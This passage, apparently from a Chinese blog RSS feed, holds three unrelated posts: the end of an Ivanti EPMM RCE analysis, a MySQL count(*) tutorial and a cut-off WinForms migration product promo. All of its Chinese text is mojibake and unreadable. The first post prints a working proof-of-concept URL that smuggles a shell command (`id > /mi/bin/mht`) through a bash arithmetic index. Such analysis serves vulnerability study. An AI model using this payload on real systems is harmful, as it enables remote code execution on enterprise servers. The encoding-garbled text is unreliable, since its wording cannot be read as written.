<p>bashä¸­ä½¿ç¨theKeyåtheValueå¾ªç¯èµå¼ï¼ä¼ åçæåä¸ä¸ªå¼ä¸ºhï¼æä»¥theValueæåçå¼æ¯å°±æ¯hçå¼ï¼é£ç°å¨å°±å¾æææäºï¼gStartTimeågEndTimeé½æé¿åº¦éå¶ï¼ä½hçå¼æ²¡æï¼è½ä¸è½è®©hçå¼èµ°å°if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; thenéé¢å»åºç¨æ°å¼ç´¢å¼+å½ä»¤æ¿æ¢å¢ï¼</p>
<p>å¯ä»¥çï¼æ¢ç¶å¨bashä¸­æåétheValue=hä¼ åï¼é£æä»¬å°±ç´æ¥è®©gStartTime=theValueï¼æç»æµç¨ï¼å¯æ§håæ°-&gt;theValue-&gt;gStartTimeï¼ç¶åè¿å¥if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]];åºç¨æ°å¼ç´¢å¼+å½ä»¤æ¿æ¢ï¼ç°å¨æä»¬å·²ç»æäºRCEçå®æ´é¾æ¡ï¼å¼å§æé æç»pocã</p>
<p>kidåæ°ä¸ºæä»¶è¡æ°ï¼éä¾¿ç¨ä¸ª1ï¼ståæ°ä¸ºtheValueï¼æ³¨æåä½é¿åº¦æ ¡éªï¼æä»¥è¿éè¦åå ä¸¤ä¸ªç©ºæ ¼ï¼etåæ°ä¹åä¸æ¯è¾ï¼ä¹å¯ä½ä¸ºtheValueä¼ åï¼stä¸etéä¾¿ä¸ä¸ªå°æ¹è®¾ç½®ä¸ºtheValueé½å¯ä»¥ï¼æåæ¯håæ°ï¼åªéè¦æ»¡è¶³array[index]å³å¯ã</p>
<p>indexé¨åçåå®¹æäºï¼arrayé¨ååä»ä¹å¢ï¼bashå¼å¤´å¼å¯äºset -o nounsetï¼è¿æ¯ä¸¥æ ¼æ¨¡å¼ï¼ä¸¥æ ¼æ¨¡å¼ä¸ï¼Bash éå°æªå®ä¹çåéä¼ç´æ¥ç»æ­¢èæ¬æ§è¡ï¼ç´æ¥ä»bashå¼å¤´å®ä¹çé£äºç©ºåééé¢éä¸ä¸ªï¼æ¯å¦gPathågHostnameé½å¯ä»¥ï¼æé æç»å¼ï¼</p>
<pre><code>gHostname[`id &gt; /mi/bin/mht`]
</code></pre>
<p>æç»pocï¼</p>
<pre><code>/mifs/c/appstore/fob/3/1120/sha256:kid=1,st=1111111111,et=theValue%20%20,h=gHostname%5B%60id%20&gt;%20/mi/bin/mht%60%5D/mht.ipa
</code></pre>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021514890.png" class="lazyload"></p>
<p>è¯¥æ¼æ´å¤ç°ç¯å¢å·²å¨æ å¢ä¸­ä¸æ¶ï¼vip.bdziyi.com/ulabï¼æ å¢ï¼è±æåUnbounded Labï¼æ¯ä¸ä¸ºç½ç»å®å¨å­¦ä¹ èæé çç»¼åæ§å®æå¹³å°ï¼æä¾çå®ä¼ä¸çº§æ¼æ´ç¯å¢ï¼è®©æ¨å¨å®å¨çç¯å¢ä¸­æåå®ææè½ï¼æ ¸å¿ç¹è²ï¼ç¬ç«éç¦»ç¯å¢ï¼æ¯ä½ç¨æ·é½æ¥æ<strong>å®å¨ç¬ç«</strong>çé¶åºç¯å¢ï¼å³ä½¿æ¯åºå¤§çåç½é¶åºï¼ç¯å¢ä¹é´ä¹æ¯<strong>é¶å¹²æ°</strong>ï¼ç¡®ä¿æ¨çå­¦ä¹ è¿ç¨ä¸åä»»ä½å½±åã</p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 18:41">2026-02-02 18:41</span>&nbsp;
<a href="https://www.cnblogs.com/mhtsec">å¬ä¼å·æ£è±ç³fans</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19566043);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19566043', targetLink: 'https://www.cnblogs.com/mhtsec/p/19566043', title: 'Ivanti EPMM RCE CVE-2026-1340/1281å®æ´åæ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ãé¢è¯é¢ãMySQL ä¸­ count(*)ãcount(1) å count(å­æ®µå) æä»ä¹åºå«ï¼ ]]></title>
    <link>https://www.cnblogs.com/sun-10387834/p/19452600</link>
    <guid>8623fe991e88bdfb40376c9d2b25dacc</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/sun-10387834/p/19452600" title="åå¸äº 2026-02-02 16:25">
    <span role="heading" aria-level="2">ãé¢è¯é¢ãMySQL ä¸­ count(*)ãcount(1) å count(å­æ®µå) æä»ä¹åºå«ï¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="mysql-ä¸­ç-count-ä¸åå¼æçå¤§æ¯æ¼">MySQL ä¸­ç count ä¸åå¼ï¼æçå¤§æ¯æ¼ï¼ð</h1>
<h2 id="ä¸å¿«éç»è®ºåçç»è®ºåçåæ">ä¸ãå¿«éç»è®ºï¼åçç»è®ºåçåæï¼</h2>
<table>
<thead>
<tr>
<th>æ¹å¼</th>
<th>ä½ç¨</th>
<th>æç</th>
<th>ä¸å¥è¯æ»ç»</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>count(*)</code></td>
<td><strong>ç»è®¡ææè¡æ°</strong></td>
<td>â­â­â­â­ <strong>æé«</strong></td>
<td>ææ¯ä¸ä¸çï¼æä¸ºç»è®¡èç</td>
</tr>
<tr>
<td><code>count(1)</code></td>
<td>ç»è®¡ææè¡æ°</td>
<td>â­â­â­â­ åæ ·é«æ</td>
<td>ææ¯ count(*) çé©¬ç²åå¼</td>
</tr>
<tr>
<td><code>count(åå)</code></td>
<td>ç»è®¡è¯¥å<strong>é NULL</strong> çè¡æ°</td>
<td>â­â­â­ è¾æ¢</td>
<td>ææåï¼æåªæ°éç©ºå¼</td>
</tr>
</tbody>
</table>
<p><strong>ç»è®ºï¼ç¨ <code>count(*)</code> å°±å¯¹äºï¼</strong> â</p>
<h2 id="äºä»£ç ç¤ºä¾äº²æµä¸åå¼çå·®å«">äºãä»£ç ç¤ºä¾ï¼äº²æµä¸åå¼çå·®å«</h2>
<h3 id="åå¤æµè¯æ°æ®">åå¤æµè¯æ°æ®</h3>
<pre><code class="language-sql">-- åå»ºæµè¯è¡¨
CREATE TABLE user_test (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(50),
    age INT,
    email VARCHAR(100)
);

-- æå¥æµè¯æ°æ®ï¼æææå¥ä¸äºNULLå¼ï¼
INSERT INTO user_test (name, age, email) VALUES
('å¼ ä¸', 25, 'zhangsan@example.com'),
('æå', NULL, NULL),
('çäº', 30, 'wangwu@example.com'),
(NULL, 28, 'unknown@example.com'),
('èµµå­', 35, NULL);
</code></pre>
<h3 id="æµè¯æ¥è¯¢">æµè¯æ¥è¯¢</h3>
<pre><code class="language-sql">-- æ¥çè¡¨ä¸­çæ°æ®
SELECT * FROM user_test;
/*
+----+--------+------+--------------------+
| id | name   | age  | email              |
+----+--------+------+--------------------+
|  1 | å¼ ä¸   |   25 | zhangsan@example...|
|  2 | æå   | NULL | NULL               |
|  3 | çäº   |   30 | wangwu@example.com |
|  4 | NULL   |   28 | unknown@example.com|
|  5 | èµµå­   |   35 | NULL               |
+----+--------+------+--------------------+
*/

-- æµè¯1ï¼count(*) ç»è®¡ææè¡æ°
SELECT count(*) FROM user_test;  -- ç»æï¼5 â
-- ç¿»è¯ï¼"èæ¿ï¼ææå¤å°è¡æ°æ®ï¼å¨é½è¦ï¼"

-- æµè¯2ï¼count(1) ç»è®¡ææè¡æ°  
SELECT count(1) FROM user_test;  -- ç»æï¼5 â
-- ç¿»è¯ï¼"èæ¿ï¼ä½ ç»æä¸ªåºå®å¼1ï¼ææ°æå¤å°ä¸ª1"

-- æµè¯3ï¼count(åå) ç»è®¡éNULLçè¡æ°
SELECT count(name) FROM user_test;  -- ç»æï¼4 âï¼NULLçé£è¡æ²¡ç®ï¼
SELECT count(age) FROM user_test;   -- ç»æï¼4 âï¼NULLçé£è¡æ²¡ç®ï¼
SELECT count(email) FROM user_test; -- ç»æï¼3 âï¼ä¸¤ä¸ªNULLé½æ²¡ç®ï¼
-- ç¿»è¯ï¼"æåªæ°æèº«ä»½è¯çäººï¼é»æ·ä¸ç®"
</code></pre>
<h2 id="ä¸æ·±å¥åæå®ä»¬å°åºæå¥ä¸å">ä¸ãæ·±å¥åæï¼å®ä»¬å°åºæå¥ä¸åï¼</h2>
<h3 id="1-è¯­ä¹åºå«æéè¦çåºå«">1. <strong>è¯­ä¹åºå«ï¼æéè¦çåºå«ï¼ï¼</strong></h3>
<pre><code class="language-sql">-- count(*) æ¯ SQL æ ååæ³
-- ææï¼ç»æè¿ä¸ªè¡¨æå¤å°è¡æ°æ®
-- ç¸å½äºï¼"è¿ä¸ªä¼è®®å®¤æå¤å°ä¸ªåº§ä½ï¼"

-- count(1) æ¯ count(*) çä¸ç§åæ³
-- ææï¼ç»è®¡æå¤å°ä¸ª1
-- ç¸å½äºï¼"ç»æ¯ä¸ªåº§ä½åä¸ªè¹æï¼æåæ°è¹æ"

-- count(åå) æ¯ç»è®¡è¯¥åéNULLå¼çæ°é
-- ææï¼è¿ä¸ªä¼è®®å®¤æå¤å°äººå¸¦äºææº
-- ç¸å½äºï¼"æ£æ¥æ¯ä¸ªåº§ä½ï¼å¦ææäººå¸¦äºææºå°±è®¡æ°"
</code></pre>
<h3 id="2-æ§è½åºå«ç¥è¯ä¸ç°å®">2. <strong>æ§è½åºå«ï¼ç¥è¯ä¸ç°å®ï¼</strong></h3>
<h4 id="ä¼ è¯´ä¸­çè¯¯è§£">ä¼ è¯´ä¸­çè¯¯è§£ï¼</h4>
<blockquote>
<p>"count(1) æ¯ count(*) å¿«" â<br>
"count(ä¸»é®) æå¿«" â</p>
</blockquote>
<h4 id="ç°å®çç¸">ç°å®çç¸ï¼</h4>
<p><strong>MySQL 5.7 åä»¥åçæ¬</strong>ï¼</p>
<ul>
<li><code>count(*)</code> å <code>count(1)</code> æ§è½<strong>å®å¨ç¸å</strong></li>
<li>MySQL ä¼åå¨ä¼æå®ä»¬å½ä½ä¸åäº</li>
</ul>
<p><strong>æ¥çæ§è¡è®¡åè¯æ</strong>ï¼</p>
<pre><code class="language-sql">EXPLAIN SELECT count(*) FROM user_test;
EXPLAIN SELECT count(1) FROM user_test;
EXPLAIN SELECT count(id) FROM user_test;
-- ä½ ä¼çå°ï¼åä¸¤ä¸ªçæ§è¡è®¡åå®å¨ä¸æ ·ï¼
</code></pre>
<p><strong>æ§è½æåº</strong>ï¼ä¸è¬æåµï¼ï¼</p>
<ol>
<li><code>count(*)</code> â <code>count(1)</code> â­â­â­â­â­</li>
<li><code>count(ä¸»é®å)</code> â­â­â­â­</li>
<li><code>count(éä¸»é®æç´¢å¼å)</code> â­â­â­</li>
<li><code>count(éä¸»é®æ ç´¢å¼å)</code> â­â­</li>
</ol>
<p><strong>ä¸ºä»ä¹ <code>count(åå)</code> å¯è½æ´æ¢ï¼</strong></p>
<pre><code class="language-sql">-- åè®¾ email åæç´¢å¼
SELECT count(email) FROM user_test;
/*
MySQL éè¦ï¼
1. è¯»åç´¢å¼ï¼å¦æè¯¥åæç´¢å¼ï¼
2. æ£æ¥æ¯ä¸ªå¼æ¯å¦ä¸º NULL
3. åªè®¡æ°é NULL ç

å¦æ email åæ²¡æç´¢å¼ï¼
1. è¯»åæ´è¡æ°æ®ï¼æ¯ count(*) è¯»çæ´å¤ï¼
2. æ£æ¥ email æ¯å¦ä¸º NULL
3. åªè®¡æ°é NULL ç
*/
</code></pre>
<h3 id="3-ç¹æ®æåµåæ">3. <strong>ç¹æ®æåµåæ</strong></h3>
<pre><code class="language-sql">-- æåµ1ï¼ææåé½ä¸åè®¸NULL
CREATE TABLE user_not_null (
    id INT PRIMARY KEY NOT NULL,
    name VARCHAR(50) NOT NULL
);
-- è¿æ¶åï¼count(*) = count(id) = count(name)

-- æåµ2ï¼ç©ºè¡¨ vs NULLå¼
CREATE TABLE empty_table (id INT);
SELECT count(*) FROM empty_table;    -- ç»æï¼0
SELECT count(id) FROM empty_table;   -- ç»æï¼0

INSERT INTO empty_table VALUES (NULL);
SELECT count(*) FROM empty_table;    -- ç»æï¼1
SELECT count(id) FROM empty_table;   -- ç»æï¼0 â
</code></pre>
<h2 id="åå®éå·¥ä½ä¸­çéæ©æå">åãå®éå·¥ä½ä¸­çéæ©æå</h2>
<h3 id="-åºæ¯1ç»è®¡æ»è¡æ°">ð¯ <strong>åºæ¯1ï¼ç»è®¡æ»è¡æ°</strong></h3>
<pre><code class="language-sql">-- â æ­£ç¡®åæ³
SELECT count(*) FROM orders;

-- â éè¯¯åæ³
SELECT count(order_id) FROM orders;  -- ä¸ä¸æNULLå¢ï¼
SELECT count(1) FROM orders;         -- è½ç¨ï¼ä½ä¸æ¯æ å
</code></pre>
<h3 id="-åºæ¯2ç»è®¡æææ°æ®æ°é">ð¯ <strong>åºæ¯2ï¼ç»è®¡æææ°æ®æ°é</strong></h3>
<pre><code class="language-sql">-- ç»è®¡æå¤å°ç¨æ·å¡«åäºé®ç®±
SELECT count(email) FROM users;  -- â è¿ä¸ªåºæ¯å°±è¯¥ç¨ count(åå)

-- ç»è®¡å·²å®æè®¢åæ°éï¼åè®¾ status=2 æ¯å·²å®æï¼
SELECT count(*) FROM orders WHERE status = 2;  -- â
</code></pre>
<h3 id="-åºæ¯3ç»è®¡ééå¤å¼">ð¯ <strong>åºæ¯3ï¼ç»è®¡ééå¤å¼</strong></h3>
<pre><code class="language-sql">-- ç»è®¡æå¤å°ä¸ªä¸åçåå¸
SELECT count(DISTINCT city) FROM users;  -- â count + DISTINCT

-- ç»è®¡æå¤å°ä¸ªåå¸ï¼æé¤ NULL
SELECT count(DISTINCT city) FROM users;  -- DISTINCT ä¼èªå¨æé¤ NULL
</code></pre>
<h2 id="äºæ§è½ä¼åæå·§">äºãæ§è½ä¼åæå·§</h2>
<h3 id="1-å¤§è¡¨ä¼åæ¹æ¡">1. <strong>å¤§è¡¨ä¼åæ¹æ¡</strong></h3>
<pre><code class="language-sql">-- æ¹æ¡1ï¼ä½¿ç¨è¿ä¼¼å¼ï¼éç¨äºç»è®¡æ¦è§ï¼
SELECT TABLE_ROWS 
FROM information_schema.TABLES 
WHERE TABLE_SCHEMA = 'your_db' AND TABLE_NAME = 'big_table';

-- æ¹æ¡2ï¼åé¡µæ»æ°ç¼å­ï¼éç¨äºåè¡¨é¡µï¼
-- ç¬¬ä¸æ¬¡æ¥è¯¢æ¶ç¼å­æ»æ°ï¼åé¢å®æ¶æ´æ°

-- æ¹æ¡3ï¼ä½¿ç¨æ±æ»è¡¨
CREATE TABLE stats_daily (
    date DATE PRIMARY KEY,
    user_count INT,
    order_count INT
);
</code></pre>
<h3 id="2-ç´¢å¼ä¼å">2. <strong>ç´¢å¼ä¼å</strong></h3>
<pre><code class="language-sql">-- ä¸º count(åå) åå»ºç´¢å¼
CREATE INDEX idx_email ON users(email);

-- ä½æ³¨æï¼count(*) ä¸ä¸å®éè¦ç´¢å¼ï¼InnoDBæä¼å
</code></pre>
<h2 id="å­æè¶£æ¯å»å¸®ä½ è®°å¿">å­ãæè¶£æ¯å»å¸®ä½ è®°å¿</h2>
<h3 id="-æ±å ¡åºæéæ¯å»">ð <strong>æ±å ¡åºæéæ¯å»</strong></h3>
<pre><code class="language-sql">-- æ10ä¸ªäººå¨æéä¹°æ±å ¡

count(*) = "éåéæ10ä¸ªäºº" â
count(1) = "æç»æ¯äººåä¸ªå·ç çï¼æ°æ10ä¸ªç" â  
count(ç°é) = "åªæ8ä¸ªäººå¸¦äºç°é" â
count(ä¼åå¡) = "åªæ5ä¸ªäººæä¼åå¡" â
</code></pre>
<h3 id="-æå®¤ç¹åæ¯å»">ð« <strong>æå®¤ç¹åæ¯å»</strong></h3>
<pre><code class="language-sql">-- æå®¤éæ50ä¸ªåº§ä½

count(*) = "æå®¤æ50ä¸ªåº§ä½" â
count(1) = "æå¨æ¯ä¸ªåº§ä½æ¾æ¬ä¹¦ï¼æåæ°æ50æ¬" â
count(å­¦ç) = "ä»å¤©æ¥äº45ä¸ªå­¦çä¸è¯¾" âï¼ç©ºåº§ä½ä¸ç®ï¼
</code></pre>
<h2 id="ä¸æ»ç»ä¸æä½³å®è·µ">ä¸ãæ»ç»ä¸æä½³å®è·µ</h2>
<h3 id="-æç»å»ºè®®">ð <strong>æç»å»ºè®®</strong></h3>
<ol>
<li>
<p><strong>ç»è®¡æ»è¡æ°ï¼ä¸å¾ç¨ <code>count(*)</code></strong></p>
<ul>
<li>è¿æ¯ SQL æ ååæ³</li>
<li>æ§è½æä¼ï¼MySQLæä¸é¨ä¼åï¼</li>
<li>è¯­ä¹ææç¡®</li>
</ul>
</li>
<li>
<p><strong>ç»è®¡æåé NULL æ°éï¼ç¨ <code>count(åå)</code></strong></p>
<ul>
<li>è¿æ¯å®çæ¬èå·¥ä½</li>
<li>ä¸è¦ç¨å®ç»è®¡æ»è¡æ°</li>
</ul>
</li>
<li>
<p><strong>å³äº <code>count(1)</code></strong></p>
<ul>
<li>æ§è½ä¸ <code>count(*)</code> ä¸æ ·</li>
<li>ä½ä¸å¤"æ å"ï¼åæ¹è¨</li>
<li>å»ºè®®ç»ä¸ç¨ <code>count(*)</code></li>
</ul>
</li>
<li>
<p><strong>æ§è½å³é®ç¹</strong></p>
<ul>
<li>å¤§è¡¨é¿åé¢ç¹ count</li>
<li>èèä½¿ç¨ç¼å­ææ±æ»è¡¨</li>
<li>ä¸º count(åå) çåå ç´¢å¼</li>
</ul>
</li>
</ol>
<h3 id="-ä¸å¼ å¾çæ">ð <strong>ä¸å¼ å¾çæ</strong></h3>
<pre><code>count(*)       -&gt; æ»æ° -&gt; æå¿« -&gt; æ¨èä½¿ç¨
    â
count(1)       -&gt; æ»æ° -&gt; ä¸æ ·å¿« -&gt; å¯ç¨ä½ä¸æ å
    â
count(ä¸»é®)    -&gt; æ»æ° -&gt; æ¬¡å¿« -&gt; ä¸»é®éNULLæ¶å¯ç¨
    â
count(ç´¢å¼å)  -&gt; éNULLæ° -&gt; è¾æ¢ -&gt; æç´¢å¼æ¶å¯ç¨
    â  
count(æ®éå)  -&gt; éNULLæ° -&gt; ææ¢ -&gt; è°¨æä½¿ç¨
</code></pre>
<p>è®°ä½å£è¯ï¼<strong>"æ°æ»æ°ï¼ç¨æå·ï¼æ°éç©ºï¼ååå¥½ï¼æ°å­1ï¼è½é«æï¼ä¸æ¯æ åå«å½å®"</strong> ð¯</p>


</div>
<div id="MySignature" role="contentinfo">
    
<p>â¤ï¸ å¦æä½ åæ¬¢è¿ç¯æç« ï¼è¯·ç¹èµæ¯æï¼ ð åæ¶æ¬¢è¿å³æ³¨æçåå®¢ï¼è·åæ´å¤ç²¾å½©åå®¹ï¼</p>

<p>æ¬ææ¥èªåå®¢å­ï¼ä½èï¼<a href="https://www.cnblogs.com/sun-10387834/" target="_blank">ä½ç¥è®©ææ¥å·¡å±±</a>ï¼è½¬è½½è¯·æ³¨æåæé¾æ¥ï¼<a href="https://www.cnblogs.com/sun-10387834/p/19452600" target="_blank">https://www.cnblogs.com/sun-10387834/p/19452600</a></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 16:25">2026-02-02 16:25</span>&nbsp;
<a href="https://www.cnblogs.com/sun-10387834">ä½ç¥è®©ææ¥å·¡å±±</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19452600);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19452600', targetLink: 'https://www.cnblogs.com/sun-10387834/p/19452600', title: 'ãé¢è¯é¢ãMySQL ä¸­ count(*)ãcount(1) å count(å­æ®µå) æä»ä¹åºå«ï¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ MWGAè®©åäº¿è¡ä»£ç å¨Webç«¯âå¤æ´»âï¼ ]]></title>
    <link>https://www.cnblogs.com/xdesigner/p/19565029</link>
    <guid>96613893f5a475bf08ba98d662373bb9</guid>
    <description>
    <![CDATA[ 
		<h2>
			<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/xdesigner/p/19565029" title="åå¸äº 2026-02-02 16:09">
    <span role="heading" aria-level="2">MWGAè®©åäº¿è¡ä»£ç å¨Webç«¯âå¤æ´»âï¼</span>
    

</a>

		</h2>
		<div class="postText">    <div id="cnblogs_post_description" style="display: none">
        
        åäº¬é½æä¿¡æ¯ç åç MWGAââä¸æ¬¾è½å¤å¸®å©ä¼ä¸åå¼åèå°ä½¿ç¨GDI+ç»å¾çå¤æçä¼ ç»Winformsç¨åºå¿«éãä½ææ¬è¿ç§»å°Blazor WASMå¹³å°çè¿ç§»å·¥å·ï¼å®æç ´äºWinformsç¨åºé¾ä»¥è·¨å¹³å°ãééæ§å·®çå°å¢ï¼ä»éæä½ä¿®æ¹éï¼éå¸¸ä¸è¶è¿10%ï¼å°±è½å°ä¼ ç»Winformsç¨åºæ ç¼è½¬ä¸ºå¯ç½é¡µå è½½çBlazor WASMçæ¬ã
è¿æå³çï¼ä¼ä¸æ ééåä¸å¡é»è¾ï¼æ éå­¦ä¹ å¨æ°åç«¯æ¡æ¶ï¼æ´æ éæåé¢å¤çåç«¯å¼åäººåââä¸å¥ä»£ç ï¼åæ¶ç¼è¯ä¸º.exeä¸.wasmï¼åç«¯è¿è¡ï¼ä½éªä¸è´ï¼ä¸ºä¼ä¸èçå¤§éå¼åææ¬ä¸æ¶é´ï¼å°¤å¶ééå»çç­å¯¹ä¿¡åæè¿«åéæ±çè¡ä¸ï¼
    </div>
<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ç¹å¤§åè®¯ï¼åäº¬é½æä¿¡æ¯ç åç&nbsp;MWGAââä¸æ¬¾è½å¤å¸®å©ä¼ä¸åå¼åèå°ä½¿ç¨GDI+ç»å¾çå¤æçä¼ ç»Winformsç¨åºå¿«éãä½ææ¬è¿ç§»å°Blazor WASMå¹³å°çè¿ç§»å·¥å·ï¼å®æç ´äºWinformsç¨åºé¾ä»¥è·¨å¹³å°ãééæ§å·®çå°å¢ï¼ä»éæä½ä¿®æ¹éï¼éå¸¸ä¸è¶è¿10%ï¼å°±è½å°ä¼ ç»Winformsç¨åºæ ç¼è½¬ä¸ºå¯ç½é¡µå è½½çBlazor WASMçæ¬ã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">è¿æå³çï¼ä¼ä¸æ ééåä¸å¡é»è¾ï¼æ éå­¦ä¹ å¨æ°åç«¯æ¡æ¶ï¼æ´æ éæåé¢å¤çåç«¯å¼åäººåââä¸å¥ä»£ç ï¼åæ¶ç¼è¯ä¸º.exeä¸.wasmï¼åç«¯è¿è¡ï¼ä½éªä¸è´ï¼ä¸ºä¼ä¸èçå¤§éå¼åææ¬ä¸æ¶é´ï¼å°¤å¶ééå»çç­å¯¹ä¿¡åæè¿«åéæ±çè¡ä¸ï¼</span></p>
<h1><strong class="135brush" data-brushtype="text"><strong>ä¸ã</strong></strong><strong class="135brush" data-brushtype="text"><strong>æä½ä¿®æ¹ï¼æé«è¿å</strong></strong></h1>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">éè¿MWGAï¼åæ¬åªè½å¨Windowsæ¡é¢è¿è¡çWinformsç¨åºï¼æ ééåï¼å³å¯è½¬åä¸ºéè¿æµè§å¨è®¿é®çWebAssemblyåºç¨ãä»¥ä¸ä¸ºä¸ä¸ªæ¡ä¾å±ç¤ºï¼</span></p>
<span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>æ¡ä¾ä¸ï¼ç»å¸æ«é·æ¸¸æï¼2500è¡ä»£ç ï¼</strong></span>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><em>å¾1ï¼winfromç</em></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><em>æ«é·æ¯ä¸ä¸ªç»å¸çWindowsæ¸¸æç¨åºï¼è¿æ¯ä¸ä¸ª10å¹´ååçWinformsç¨åºï¼åå«çº¦2500è¡C#ä»£ç ä»¥åè¥å¹²å¾çèµæºæä»¶</em></span></p>
<p><img src="https://img2024.cnblogs.com/blog/12406/202601/12406-20260119115236297-958633113.png" alt="æ«é·æ¸¸æ" loading="lazy"></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><em>å¾2ï¼è½¬æ¢å</em></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><em>æä»¬å¯¹æ§ä»£ç ä¿®æ¹äºä¸è¶è¿50è¡(å æ¯2%)å°±è®©åä¸å¥ä»£ç å¯ä»¥æ éä¿®æ¹å³å¯ç¼è¯æ .exe å.wasmæä»¶ã</em></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><img src="https://img2024.cnblogs.com/blog/12406/202601/12406-20260119115330834-395365830.png" alt="å¾ç2" loading="lazy"></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ç»¼ä¸</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼1ï¼åé¡¹ç®ï¼</strong>10å¹´åç¼åçWinformsæ«é·æ¸¸æï¼ä¾èµGDI+è¿è¡çé¢ç»å¶ã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼2ï¼è¿ç§»è¿ç¨ï¼</strong>ä½¿ç¨MWGAå¯¼å¥é¡¹ç®ï¼ä»ä¿®æ¹çº¦50è¡ä»£ç ï¼å æ¯2%ï¼ï¼ä¸»è¦ä½¿ç¨&nbsp;#if&nbsp; MWGA&nbsp;æ¡ä»¶ç¼è¯ï¼å°é¨ååæ­¥æ¹æ³æ¹ä¸ºå¼æ­¥ééã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼3ï¼ç»æï¼</strong>åä¸å¥ä»£ç æ éæ¹å¨ç»å¾é»è¾ï¼ç´æ¥ç¼è¯ä¸º.wasmæä»¶ï¼å¨ChromeãFirefoxãSafariç­æµè§å¨ä¸­å®ç¾è¿è¡ï¼çé¢ä¸äº¤äºä¸åçä¸è´ï¼</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">è¥æ²¡æMWGAï¼ç¨æ·è¿éä»åç«¯éåæ´ä¸ªæ¸¸æï¼èæ¶èåï¼ææ¬é«ãèç°å¨ï¼åå¼åäººåå¯ç´æ¥å¨Winformsé¡¹ç®ä¸ç»§ç»­è¿­ä»£ï¼åæ­¥çæç½é¡µçï¼</span></p>
<p>&nbsp;</p>
<span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>æ¡ä¾äºï¼æºè½è®¡ç®å¨ï¼460è¡ä»£ç ï¼</strong></span>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><em>å¾3ï¼winfromç</em></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><em>è¿æ¯ä¸ä¸ªWinform.NETçè®¡ç®å¨ç¨åºï¼åå«460è¡C#ä»£ç </em></span></p>
<p><span style="font-size: 16px"><em><img src="https://img2024.cnblogs.com/blog/12406/202601/12406-20260119115427518-107951139.png" alt="è®¡ç®å¨" loading="lazy"></em></span></p>
<p><span style="font-size: 16px"><em>å¾4ï¼è½¬æ¢å</em></span></p>
<p><span style="font-size: 16px"><em>ä»£ç æªåä»»ä½ä¿®æ¹ï¼åå©MWGAï¼å®å¨Blazor WASMä¸­è¿è¡çé¢å¦ä¸å¾æç¤ºã</em></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><img src="https://img2024.cnblogs.com/blog/12406/202601/12406-20260119115505304-749089367.png" alt="å¾ç4" loading="lazy"></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ç»¼ä¸</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼1ï¼åé¡¹ç®ï¼</strong>Winformsè®¡ç®å¨ï¼æ¯æçªä½ææ½èªéåºå¸å±ã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼2ï¼è¿ç§»è¿ç¨ï¼</strong>ä»£ç é¶ä¿®æ¹ï¼ç´æ¥éè¿MWGAè¿ç§»è³Blazor WASMã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼3ï¼ç»æï¼</strong>å¨æµè§å¨ä¸­è¿è¡ï¼çªä½å¤§å°è°æ´ãæé®èªéåºå¸å±ç­è¡ä¸ºå®å¨ä¿çï¼ç¨æ·ä½éªæ æè¿ç§»ï¼</span></p>
